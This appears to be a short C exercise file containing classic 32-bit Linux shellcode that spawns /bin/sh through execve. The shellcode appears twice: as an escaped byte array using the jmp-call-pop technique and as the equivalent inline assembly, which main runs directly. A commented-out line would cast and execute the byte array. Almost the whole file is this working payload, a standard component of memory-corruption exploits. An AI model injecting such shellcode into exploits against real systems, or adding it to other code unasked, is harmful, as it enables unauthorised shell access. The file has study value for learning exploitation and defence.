#include <stdio.h>

char shellcode[] = 
  "\xeb\x15"
  "\x5b"
  "\x31\xd2"
  "\x52"
  "\x52"
  "\x53"
  "\x31\xc0"
  "\xb0\x0b"
  "\x50"
  "\xcd\x80"
  "\x31\xdb"
  "\x31\xc0"
  "\xb0\x01"
  "\xcd\x80"
  "\xe8\xe6\xff\xff\xff"
  "/bin/sh"
;

void call_asm() {
  asm(
      "jmp __lend \n"
      "__lbegin: \n"
      "pop %ebx \n"
      "xor %edx,%edx \n"
      "xor %ecx,%ecx \n"
      "mov %dl,0x7(%ebx) \n" 
      //      "push %edx \n"
      //"push %edx \n"
      //"push %ebx \n"
      "xor %eax,%eax \n"
      "mov $0xb,%al \n"
      //"push %eax \n"
      "int $0x80 \n"
      "xor %ebx,%ebx \n"
      "xor %eax,%eax \n"
      "mov $0x1,%al \n"
      "int $0x80 \n"
      "__lend: \n"
      "call __lbegin \n"
      ".string \"/bin/sh\" \n"
      );
}

int main(void) {
  //(*(void(*)()) shellcode)();
  call_asm();
}
